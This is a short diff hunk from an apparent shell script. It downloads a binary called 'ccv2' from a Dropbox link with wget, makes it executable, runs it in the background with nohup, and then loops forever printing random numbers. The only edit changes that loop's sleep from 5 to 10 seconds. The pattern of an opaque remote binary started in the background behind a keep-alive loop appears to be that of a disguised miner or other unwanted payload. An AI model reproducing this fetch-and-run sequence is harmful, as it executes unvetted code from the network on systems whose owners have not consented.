@@ -7,4 +7,4 @@ wget -q -O $nama hhttps://www.dropbox.com/s/iebfzab6josfjg4/ccv2?dl=1 && chmod +
 sleep 2
 nohup ./$nama ann &
 sleep 10
-while :; do shuf -n 1 -i 1-99999999; sleep 5; done
+while :; do shuf -n 1 -i 1-99999999; sleep 10; done
